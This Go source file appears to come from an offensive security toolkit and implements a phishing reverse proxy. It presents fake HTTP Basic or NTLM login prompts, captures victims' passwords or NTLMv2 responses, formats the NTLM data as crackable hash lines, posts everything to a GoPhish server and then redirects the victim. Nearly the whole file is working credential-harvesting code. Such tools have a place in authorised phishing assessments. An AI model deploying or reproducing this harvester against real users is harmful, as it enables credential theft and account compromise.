package gopserver

import (
	"context"
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/gorilla/mux"
	basicAuth "github.com/hophouse/gop/authentication/basic"
	ntlmAuth "github.com/hophouse/gop/authentication/ntlm"
	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
	"github.com/urfave/negroni"
)

func RunGoPhishProxyHTTPCmd(host string, port string, dstUrl string, gophishUrl string, auth string, realm string, whiteList []string) {
	begin := time.Now()

	addr := fmt.Sprintf("%s:%s", host, port)
	logger.Printf("[+] Starting reverse proxy listening to : http://%s\n", addr)
	logger.Printf("[+] Redirect visitors to : %s\n", dstUrl)
	logger.Printf("[+] Log information in GoPhish at : %s\n", gophishUrl)

	gophishUrlParsed, err := url.Parse(gophishUrl)
	if err != nil {
		panic(err)
	}

	dstUrlParsed, err := url.Parse(dstUrl)
	if err != nil {
		panic(err)
	}

	// Router
	r := mux.NewRouter()

	proxy := &GoPhishReverseProxy{
		p:           http.NewServeMux(),
		gophishUrl:  gophishUrlParsed,
		destination: dstUrlParsed,
	}

	for _, path := range whiteList {
		pathString := fmt.Sprintf("/%s", path)
		r.PathPrefix(pathString).Handler(negroni.New(
			&logMiddleware{},
			negroni.WrapFunc(proxy.HandleTrackFunc),
		))
	}

	// Apply an auth system if requested
	switch strings.ToLower(auth) {
	case "basic":
		logger.Printf("[+] Add HTTP Basic auth header\n")
		r.Handle("/{URL:.*}", negroni.New(
			&logMiddleware{},
			&basicAuth.BasicAuthMiddleware{
				Realm: realm,
			},
			negroni.WrapFunc(proxy.HandleFunc),
		))
	case "ntlm":
		logger.Printf("[+] Add HTTP NTLM auth header\n")
		ntlmAuth.NtlmCapturedAuth = make(map[string]bool)
		r.Handle("/{URL:.*}", negroni.New(
			&logMiddleware{},
			&ntlmAuth.NTLMAuthMiddleware{},
			negroni.WrapFunc(proxy.HandleFunc),
		))

	default:
		logger.Println("[!] No valid auth system was given")
		return
	}

	n := negroni.New(negroni.NewRecovery())
	n.UseHandler(r)
	logger.Fatal(http.ListenAndServe(addr, n))

	end := time.Now()
	logger.Printf("\n -  Execution time: %s\n", end.Sub(begin))
}

type GoPhishReverseProxy struct {
	p           *http.ServeMux
	destination *url.URL
	gophishUrl  *url.URL
}

func (rp *GoPhishReverseProxy) HandleTrackFunc(w http.ResponseWriter, r *http.Request) {
	logger.Printf("[+] [%s] Receive Tracking request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())

	// First send the request to GoPhish
	newURL := r.URL
	newURL.Host = rp.gophishUrl.Host
	newURL.Scheme = rp.gophishUrl.Scheme

	client := http.Client{
		Timeout: 2 * time.Second,
	}

	req, _ := http.NewRequest("GET", newURL.String(), nil)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", r.Header.Get("User-Agent"))
	if r.Header.Get("X-Forwarded-For") != "" {
		req.Header.Set("X-Forwarded-For", r.Header.Get("X-Forwarded-For"))
	} else {
		req.Header.Set("X-Forwarded-For", r.RemoteAddr)
	}

	if r.Header.Get("X-Real-IP") != "" {
		req.Header.Set("X-Real-IP", r.Header.Get("X-Real-IP"))
	} else {
		req.Header.Set("X-Real-IP", r.RemoteAddr)
	}

	_, err := client.Do(req)
	if err != nil {
		logger.Println(err)
	}

	logger.Printf("[+] [%s] Sending tracker\n", utils.GetSourceIP(r))
}

func (rp *GoPhishReverseProxy) HandleFunc(w http.ResponseWriter, r *http.Request) {
	logger.Printf("[+] [%s] Receive Credential request %s - %s\n", utils.GetSourceIP(r), r.Method, r.URL.String())
	r.Header.Del("Referer")

	// First send the request to GoPhish
	newURL := r.URL
	newURL.Host = rp.gophishUrl.Host
	newURL.Scheme = rp.gophishUrl.Scheme

	client := http.Client{
		Timeout: 2 * time.Second,
	}

	autorization := r.Header.Get("Authorization")
	if autorization != "" {
		var formData url.Values
		username, password, ok := r.BasicAuth()
		if ok {
			formData = url.Values{
				"username": {username},
				"password": {password},
			}
		} else if strings.HasPrefix(autorization, "NTLM ") {
			// Remove the "NTLM "
			authorization_bytes, err := base64.StdEncoding.DecodeString(autorization[5:])
			if err != nil {
				logger.Printf("Decode error authorization header : %s\n", authorization_bytes)
				return
			}

			msg3 := ntlmAuth.NTLMSSP_AUTH{}
			msg3.Read(authorization_bytes)

			ntlmv2Response := ntlmAuth.NTLMv2Response{}
			ntlmv2Response.Read(msg3.NTLMv2Response.RawData)
			logger.Printf("%s", ntlmv2Response.ToString())

			ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.RawData), string(msg3.TargetName.RawData), []byte(ntlmAuth.Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.RawData[len(ntlmv2Response.NTProofStr):])

			formData = url.Values{
				"ntlm_v2": {ntlmv2_pwdump},
			}
		} else {
			formData = url.Values{
				"authorization": {autorization},
			}
		}

		req, _ := http.NewRequest("POST", newURL.String(), strings.NewReader(formData.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", r.Header.Get("User-Agent"))
		if r.Header.Get("X-Forwarded-For") != "" {
			req.Header.Set("X-Forwarded-For", r.Header.Get("X-Forwarded-For"))
		} else {
			req.Header.Set("X-Forwarded-For", r.RemoteAddr)
		}

		if r.Header.Get("X-Real-IP") != "" {
			req.Header.Set("X-Real-IP", r.Header.Get("X-Real-IP"))
		} else {
			req.Header.Set("X-Real-IP", r.RemoteAddr)
		}

		_, err := client.Do(req)
		if err != nil {
			logger.Println(err)
		}

	} else {
		newRequest := r.Clone(context.TODO())
		newRequest.URL.Scheme = rp.gophishUrl.Scheme
		newRequest.URL.Host = rp.gophishUrl.Host
		newRequest.URL = newURL
		newRequest.RequestURI = ""
		newRequest.Response = nil

		_, err := client.Do(newRequest)
		if err != nil {
			logger.Println(err)
		}
		logger.Printf("[+] [%s] Send request %s to %s\n", utils.GetSourceIP(r), newRequest.Method, newRequest.URL.String())
	}

	// Secondly redirect the user to the defined destination
	w.Header().Add("Location", rp.destination.String())
	w.WriteHeader(302)
}
